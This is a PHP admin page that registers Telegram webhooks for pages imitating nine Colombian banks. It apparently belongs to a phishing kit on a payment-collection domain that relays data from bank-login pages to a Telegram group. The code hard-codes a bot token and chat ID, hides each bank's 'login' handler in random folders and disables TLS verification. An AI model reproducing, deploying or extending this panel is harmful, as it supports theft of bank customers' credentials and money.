<?php
// activar_webhooks.php — Administrador Centralizado de Webhooks de Telegram
error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', 0);

$config = require __DIR__ . '/config.php';
$botToken = $config['botToken'] ?? '8563506224:AAHyMt9lKuRdadu3HqXMN3LMA3oukd8P-dk';
$chatId   = $config['chatId'] ?? '-1003796119223';
$secKey   = $config['security_key'] ?? 'secure_key_123';

// Base URL predeterminada
$detectedScheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'https';
$detectedHost   = $_SERVER['HTTP_HOST'] ?? 'recaudoairepago.vercel.app';
$defaultBaseUrl = "https://recaudoairepago.vercel.app";

// Lista de Webhooks por Pasarela
$webhooks = [
    'lulo' => [
        'nombre' => 'Lulo Bank',
        'carpeta' => 'pago/f1e93a7b',
        'archivo' => 'pago/f1e93a7b/webhook.php',
    ],
    'caja_social' => [
        'nombre' => 'Banco Caja Social',
        'carpeta' => 'pago/7d4e0b2a',
        'archivo' => 'pago/7d4e0b2a/webhook.php',
    ],
    'itau' => [
        'nombre' => 'Banco Itaú',
        'carpeta' => 'pago/a4c81f2e',
        'archivo' => 'pago/a4c81f2e/webhook.php',
    ],
    'occidente' => [
        'nombre' => 'Banco de Occidente',
        'carpeta' => 'pago/1e8a4d7b',
        'archivo' => 'pago/1e8a4d7b/webhook.php',
    ],
    'mundo_mujer' => [
        'nombre' => 'Banco Mundo Mujer',
        'carpeta' => 'pago/d8b24e0a',
        'archivo' => 'pago/d8b24e0a/webhook.php',
    ],
    'union' => [
        'nombre' => 'Banco Unión',
        'carpeta' => 'pago/b2e4f08a',
        'archivo' => 'pago/b2e4f08a/webhook.php',
    ],
    'popular' => [
        'nombre' => 'Banco Popular',
        'carpeta' => 'pago/e9f2b14c',
        'archivo' => 'pago/e9f2b14c/login/webhook.php',
    ],
    'serfinanza' => [
        'nombre' => 'Banco Serfinanza',
        'carpeta' => 'pago/7a1d8e3f',
        'archivo' => 'pago/7a1d8e3f/login/webhook.php',
    ],
    'bancolombia' => [
        'nombre' => 'Bancolombia',
        'carpeta' => 'pago/4c7a1d9e',
        'archivo' => 'pago/4c7a1d9e/updatetele.php',
    ],
    'global' => [
        'nombre' => 'Manejador Global',
        'carpeta' => '/',
        'archivo' => 'updatetele.php',
    ]
];

$results = [];
$currentInfo = null;

// Helper para invocar la API de Telegram
function callTelegram($botToken, $method, $params = []) {
    $url = "https://api.telegram.org/bot{$botToken}/{$method}";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if (!empty($params)) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    }
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true) ?: [];
}

// Procesar Acciones POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action  = $_POST['action'] ?? '';
    $baseUrl = rtrim(trim($_POST['base_url'] ?? $defaultBaseUrl), '/');

    if ($action === 'set_all' || $action === 'set_single') {
        $targetKey = $_POST['target_key'] ?? 'all';

        foreach ($webhooks as $key => $wh) {
            if ($action === 'set_single' && $targetKey !== $key) {
                continue;
            }

            $webhookUrl = "{$baseUrl}/{$wh['archivo']}";
            $res = callTelegram($botToken, 'setWebhook', [
                'url' => $webhookUrl,
                'drop_pending_updates' => 'false'
            ]);

            $results[$key] = [
                'nombre' => $wh['nombre'],
                'url'    => $webhookUrl,
                'ok'     => !empty($res['ok']),
                'msg'    => $res['description'] ?? ($res['ok'] ? 'Webhook activado con éxito' : 'Error desconocido')
            ];
        }
    } elseif ($action === 'delete') {
        $res = callTelegram($botToken, 'deleteWebhook', ['drop_pending_updates' => 'true']);
        $results['delete'] = [
            'nombre' => 'Eliminar Webhook',
            'url'    => 'N/A',
            'ok'     => !empty($res['ok']),
            'msg'    => $res['description'] ?? 'Webhook eliminado correctamente'
        ];
    } elseif ($action === 'test_msg') {
        $testText = "<b>🚀 Prueba de Conexión Bot Telegram</b>\n\n"
                  . "✅ Dominio Activo: <code>{$baseUrl}</code>\n"
                  . "🕒 Fecha: " . date('Y-m-d H:i:s') . "\n"
                  . "⚡ Estado: En línea y listo para recibir pagos.";

        $res = callTelegram($botToken, 'sendMessage', [
            'chat_id'    => $chatId,
            'text'       => $testText,
            'parse_mode' => 'HTML'
        ]);

        $results['test'] = [
            'nombre' => 'Mensaje de Prueba',
            'url'    => 'Telegram Group',
            'ok'     => !empty($res['ok']),
            'msg'    => $res['ok'] ? 'Mensaje de prueba enviado exitosamente' : ($res['description'] ?? 'Error')
        ];
    }
}

// Consultar estado actual del Webhook
$currentInfo = callTelegram($botToken, 'getWebhookInfo');
$infoData = $currentInfo['result'] ?? [];
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activador Central de Webhooks | Telegram</title>
    <style>
        :root {
            --bg: #0b0f19;
            --card: #151c2c;
            --card-border: #243048;
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --text: #f8fafc;
            --text-muted: #94a3b8;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            padding: 2rem 1rem;
            min-height: 100vh;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 2rem;
        }
        .header h1 {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #60a5fa, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }
        .header p {
            color: var(--text-muted);
            font-size: 0.95rem;
        }
        .card {
            background: var(--card);
            border: 1px solid var(--card-border);
            border-radius: 14px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.4);
        }
        .card h2 {
            font-size: 1.25rem;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .form-group {
            margin-bottom: 1.25rem;
        }
        label {
            display: block;
            font-size: 0.85rem;
            font-weight: 600;
            color: var(--text-muted);
            margin-bottom: 0.5rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        input[type="text"] {
            width: 100%;
            padding: 0.75rem 1rem;
            background: #0b0f19;
            border: 1px solid var(--card-border);
            border-radius: 8px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.2s;
        }
        input[type="text"]:focus {
            border-color: var(--accent);
        }
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 0.75rem;
        }
        button, .btn {
            padding: 0.75rem 1.25rem;
            border-radius: 8px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            border: none;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            transition: all 0.2s;
            text-decoration: none;
        }
        .btn-primary {
            background: var(--accent);
            color: #fff;
        }
        .btn-primary:hover {
            background: var(--accent-hover);
        }
        .btn-danger {
            background: rgba(239, 68, 68, 0.15);
            color: #fca5a5;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
        .btn-danger:hover {
            background: rgba(239, 68, 68, 0.25);
        }
        .btn-test {
            background: rgba(16, 185, 129, 0.15);
            color: #6ee7b7;
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
        .btn-test:hover {
            background: rgba(16, 185, 129, 0.25);
        }
        .badge {
            display: inline-block;
            padding: 0.25rem 0.6rem;
            border-radius: 9999px;
            font-size: 0.75rem;
            font-weight: 700;
        }
        .badge-success { background: rgba(16, 185, 129, 0.2); color: #34d399; }
        .badge-danger { background: rgba(239, 68, 68, 0.2); color: #f87171; }
        .badge-warning { background: rgba(245, 158, 11, 0.2); color: #fbbf24; }

        .table-responsive {
            overflow-x: auto;
            margin-top: 1rem;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9rem;
        }
        th, td {
            padding: 0.75rem 1rem;
            text-align: left;
            border-bottom: 1px solid var(--card-border);
        }
        th {
            color: var(--text-muted);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.75rem;
        }
        code {
            background: #0b0f19;
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            font-size: 0.85rem;
            color: #93c5fd;
        }
        .status-box {
            background: #0b0f19;
            border: 1px solid var(--card-border);
            border-radius: 8px;
            padding: 1rem;
            margin-top: 1rem;
            font-family: monospace;
            font-size: 0.85rem;
            line-height: 1.5;
        }
        .alert {
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
        }
        .alert-success { background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); color: #6ee7b7; }
        .alert-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ Activador Central de Webhooks</h1>
            <p>Conexión automática de Telegram con tus pasarelas de pago en Vercel</p>
        </div>

        <?php if (!empty($results)): ?>
            <div class="card">
                <h2>📋 Resultados de la Operación</h2>
                <div class="table-responsive">
                    <table>
                        <thead>
                            <tr>
                                <th>Pasarela</th>
                                <th>URL Registrada</th>
                                <th>Estado</th>
                                <th>Detalle</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($results as $res): ?>
                                <tr>
                                    <td><strong><?php echo htmlspecialchars($res['nombre']); ?></strong></td>
                                    <td><code><?php echo htmlspecialchars($res['url']); ?></code></td>
                                    <td>
                                        <span class="badge <?php echo $res['ok'] ? 'badge-success' : 'badge-danger'; ?>">
                                            <?php echo $res['ok'] ? 'EXITOSO' : 'ERROR'; ?>
                                        </span>
                                    </td>
                                    <td><?php echo htmlspecialchars($res['msg']); ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        <?php endif; ?>

        <!-- Formulario Principal -->
        <div class="card">
            <h2>⚙️ Configuración y Activación</h2>
            <form method="POST" action="">
                <div class="form-group">
                    <label>URL Base Pública de tu Proyecto</label>
                    <input type="text" name="base_url" value="<?php echo htmlspecialchars($_POST['base_url'] ?? $defaultBaseUrl); ?>" required>
                    <small style="color: var(--text-muted); display: block; margin-top: 0.4rem;">
                        Ejemplo: <code>https://recaudoairepago.vercel.app</code>
                    </small>
                </div>

                <div class="btn-group">
                    <button type="submit" name="action" value="set_all" class="btn-primary">
                        🚀 Activar Todos los Webhooks
                    </button>
                    <button type="submit" name="action" value="test_msg" class="btn-test">
                        💬 Enviar Mensaje de Prueba
                    </button>
                    <button type="submit" name="action" value="delete" class="btn-danger" onclick="return confirm('¿Seguro que deseas eliminar el Webhook de Telegram?');">
                        🗑️ Eliminar Webhook
                    </button>
                </div>
            </form>
        </div>

        <!-- Estado en Vivo de Telegram -->
        <div class="card">
            <h2>📡 Estado en Tiempo Real (Telegram API)</h2>
            <div class="status-box">
                <div><strong>Bot Token:</strong> <code><?php echo substr($botToken, 0, 10) . '...' . substr($botToken, -6); ?></code></div>
                <div><strong>Chat ID:</strong> <code><?php echo htmlspecialchars($chatId); ?></code></div>
                <div style="margin-top: 0.5rem;">
                    <strong>Webhook Actual en Telegram:</strong><br>
                    <code><?php echo !empty($infoData['url']) ? htmlspecialchars($infoData['url']) : '⚠️ Ninguno configurado'; ?></code>
                </div>
                <div><strong>Mensajes Pendientes:</strong> <?php echo $infoData['pending_update_count'] ?? 0; ?></div>
                <?php if (!empty($infoData['last_error_message'])): ?>
                    <div style="color: var(--danger); margin-top: 0.5rem;">
                        <strong>Último Error de Telegram:</strong> <?php echo htmlspecialchars($infoData['last_error_message']); ?>
                    </div>
                <?php endif; ?>
            </div>
        </div>

        <!-- Lista de Pasarelas Disponibles -->
        <div class="card">
            <h2>🏦 Pasarelas Registradas en el Sistema</h2>
            <div class="table-responsive">
                <table>
                    <thead>
                        <tr>
                            <th>Banco</th>
                            <th>Ruta Relativa</th>
                            <th>Acción Individual</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($webhooks as $key => $wh): ?>
                            <tr>
                                <td><strong><?php echo htmlspecialchars($wh['nombre']); ?></strong></td>
                                <td><code><?php echo htmlspecialchars($wh['archivo']); ?></code></td>
                                <td>
                                    <form method="POST" action="" style="display:inline;">
                                        <input type="hidden" name="base_url" value="<?php echo htmlspecialchars($_POST['base_url'] ?? $defaultBaseUrl); ?>">
                                        <input type="hidden" name="target_key" value="<?php echo $key; ?>">
                                        <button type="submit" name="action" value="set_single" class="btn-primary" style="padding: 0.35rem 0.75rem; font-size: 0.8rem;">
                                            Activar Este
                                        </button>
                                    </form>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>
